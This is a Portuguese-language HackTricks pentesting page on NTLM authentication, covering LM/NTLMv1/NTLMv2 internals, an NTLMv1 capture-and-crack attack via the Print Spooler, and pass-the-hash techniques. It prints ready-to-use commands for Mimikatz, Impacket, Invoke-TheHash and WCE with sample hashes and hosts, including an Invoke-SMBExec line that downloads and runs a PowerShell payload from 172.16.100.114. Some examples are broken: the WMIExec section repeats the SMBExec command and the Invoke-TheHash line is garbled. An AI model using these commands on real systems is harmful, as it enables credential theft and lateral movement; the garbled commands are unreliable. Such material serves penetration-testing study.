# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações Básicas

**Credenciais NTLM**: Nome do domínio (se houver), nome de usuário e hash de senha.

**LM** só está **habilitado** no **Windows XP e no servidor 2003** (os hashes LM podem ser quebrados). O hash LM AAD3B435B51404EEAAD3B435B51404EE significa que o LM não está sendo usado (é o hash LM da string vazia).

Por padrão, é usado o **Kerberos**, portanto, o NTLM só será usado se **não houver nenhum Active Directory configurado**, o **Domínio não existir**, o **Kerberos não estiver funcionando** (configuração incorreta) ou o **cliente** que tenta se conectar usando o IP em vez de um nome de host válido.

Os **pacotes de rede** de uma **autenticação NTLM** têm o **cabeçalho** "**NTLMSSP**".

Os protocolos: LM, NTLMv1 e NTLMv2 são suportados na DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 e NTLMv2

Você pode verificar e configurar qual protocolo será usado:

### GUI

Execute _secpol.msc_ -> Políticas locais -> Opções de segurança -> Segurança de rede: nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **usuário** introduz suas **credenciais**
2. A máquina cliente **envia uma solicitação de autenticação** enviando o **nome do domínio** e o **nome de usuário**
3. O **servidor** envia o **desafio**
4. O **cliente criptografa** o **desafio** usando o hash da senha como chave e o envia como resposta
5. O **servidor envia** para o **controlador de domínio** o **nome do domínio, o nome de usuário, o desafio e a resposta**. Se **não houver** um Active Directory configurado ou o nome do domínio for o nome do servidor, as credenciais são **verificadas localmente**.
6. O **controlador de domínio verifica se tudo está correto** e envia as informações para o servidor

O **servidor** e o **controlador de domínio** são capazes de criar um **Canal Seguro** via servidor **Netlogon** como o controlador de domínio conhece a senha do servidor (está dentro do banco de dados **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é como a mencionada **anteriormente, mas** o **servidor conhece o hash do usuário** que tenta se autenticar dentro do arquivo **SAM**. Então, em vez de perguntar ao controlador de domínio, o **servidor verificará por si mesmo** se o usuário pode se autenticar.

### Desafio NTLMv1

O **comprimento do desafio é de 8 bytes** e a **resposta tem 24 bytes** de comprimento.

O **hash NT (16 bytes)** é dividido em **3 partes de 7 bytes cada** (7B + 7B + (2B+0x00\*5)): a **última parte é preenchida com zeros**. Em seguida, o **desafio** é **cifrado separadamente** com cada parte e os bytes cifrados resultantes são **unidos**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedade**
* As 3 partes podem ser **atacadas separadamente** para encontrar o hash NT
* **DES é crackeável**
* A 3ª chave é composta sempre por **5 zeros**.
* Dado o **mesmo desafio**, a **resposta** será a **mesma**. Então, você pode dar como **desafio** para a vítima a string "**1122334455667788**" e atacar a resposta usando **tabelas arco-íris pré-computadas**.

### Ataque NTLMv1

Atualmente, está se tornando menos comum encontrar ambientes com Delegação Irrestrita configurada, mas isso não significa que você não possa **abusar de um serviço de Spooler de Impressão** configurado.

Você pode abusar de algumas credenciais/sessões que já possui no AD para **pedir à impressora que se autentique** contra algum **host sob seu controle**. Em seguida, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se ela foi feita usando **NTLMv1**, você poderá **quebrá-la**.\
Se você estiver usando o `responder`, poderia tentar \*\*usar a flag `--lm` \*\* para tentar **rebaixar** a **autenticação**.\
_Obs: para essa técnica, a autenticação deve ser realizada usando NTLMv1 (NTLMv2 não é válido)._

Lembre-se de que a impressora usará a conta do computador durante a autenticação e as contas de computador usam senhas **longas e aleatórias** que você **provavelmente não conseguirá quebrar** usando **dicionários** comuns. Mas a autenticação **NTLMv1** **usa DES** ([mais informações aqui](./#ntlmv1-challenge)), então usando alguns serviços especialmente dedicados a quebrar DES, você poderá quebrá-la (você poderia usar [https://crack.sh/](https://crack.sh), por exemplo).

### Desafio NTLMv2

O **comprimento do desafio é de 8 bytes** e **2 respostas são enviadas**: uma tem **24 bytes** de comprimento e o comprimento da **outra** é **variável**.

**A primeira resposta** é criada criptografando usando **HMAC\_MD5** a **string** composta pelo **cliente e o domínio** e usando como **chave** o **hash MD4** do **hash NT**. Em seguida, o **resultado** será usado como **chave** para criptografar usando **HMAC\_MD5** o **desafio**. Para isso, **um desafio do cliente de 8 bytes será adicionado**. Total: 24 B.

A **segunda resposta** é criada usando **vários valores** (um novo desafio do cliente, um **timestamp** para evitar **ataques de replay**...)

Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, poderá seguir este guia para obter o domínio, nome de usuário, desafio e resposta e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Depois de obter o hash da vítima**, você pode usá-lo para **se passar por ela**.\
Você precisa usar uma **ferramenta** que **realizará a autenticação NTLM usando** esse **hash**, **ou** você poderia criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, então quando qualquer **autenticação NTLM for realizada**, esse **hash será usado**. A última opção é o que o mimikatz faz.

**Lembre-se de que você também pode realizar ataques Pass-the-Hash usando contas de computador.**

### **Mimikatz**

**Precisa ser executado como administrador**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
```
Isso lançará um processo que pertencerá aos usuários que lançaram o mimikatz, mas internamente no LSASS, as credenciais salvas são as que estão dentro dos parâmetros do mimikatz. Então, você pode acessar recursos de rede como se fosse esse usuário (semelhante ao truque `runas /netonly`, mas você não precisa saber a senha em texto simples).

### Pass-the-Hash a partir do Linux

Você pode obter a execução de código em máquinas Windows usando Pass-the-Hash a partir do Linux.\
[**Acesse aqui para aprender como fazer.**](../../windows/ntlm/broken-reference/)

### Ferramentas compiladas do Impacket para Windows

Você pode baixar binários do impacket para Windows aqui: (https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Nesse caso, você precisa especificar um comando, cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Existem vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do powershell aqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

O comando `Invoke-WMIExec` é uma ferramenta do PowerShell que permite executar comandos em um host remoto usando o protocolo WMI. Isso pode ser útil para executar comandos em máquinas Windows que não possuem o WinRM habilitado ou para contornar restrições de firewall. O `Invoke-WMIExec` pode ser usado para executar comandos em um único host ou em vários hosts simultaneamente.
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

O comando `Invoke-SMBClient` é usado para se conectar a um servidor SMB e executar comandos. Isso pode ser útil para testar a autenticação NTLM em um ambiente controlado. O comando pode ser usado da seguinte maneira:

```
Invoke-SMBClient -Target <IP> -Command <comando>
```

Onde `<IP>` é o endereço IP do servidor SMB e `<comando>` é o comando que você deseja executar no servidor. Por exemplo, para listar o conteúdo de um diretório compartilhado, você pode usar o seguinte comando:

```
Invoke-SMBClient -Target <IP> -Command "dir <diretório>"
```

O comando `Invoke-SMBClient` também pode ser usado para fazer o download de arquivos do servidor SMB para o seu computador local. Para fazer isso, use o seguinte comando:

```
Invoke-SMBClient -Target <IP> -Download <arquivo remoto> -Path <caminho local>
```

Onde `<arquivo remoto>` é o caminho completo do arquivo no servidor SMB e `<caminho local>` é o caminho completo do diretório em seu computador local onde você deseja salvar o arquivo.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

O comando `Invoke-SMBEnum` é uma ferramenta útil para enumerar informações de compartilhamento SMB em um host remoto. Ele pode ser usado para obter informações sobre usuários, grupos, compartilhamentos, diretórios e arquivos compartilhados em um host remoto. O comando pode ser executado em um prompt de comando ou em um script PowerShell. É importante notar que o comando requer credenciais válidas para o host remoto.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função é uma **mistura de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer** um dos **SMBExec** e **WMIExec**, mas **não** fornecer nenhum parâmetro _**Command**_, ele apenas **verificará** se você tem **permissões suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Editor de Credenciais do Windows (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com nome de usuário e senha

{% content-ref url="../lateral-movement/" %}
[movimento lateral](../lateral-movement/)
{% endcontent-ref %}

## Extraindo credenciais de um host Windows

**Para obter mais informações sobre** [**como obter credenciais de um host Windows, você deve ler esta página**](broken-reference)**.**

## NTLM Relay e Responder

**Leia um guia mais detalhado sobre como realizar esses ataques aqui:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analisando desafios NTLM de uma captura de rede

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
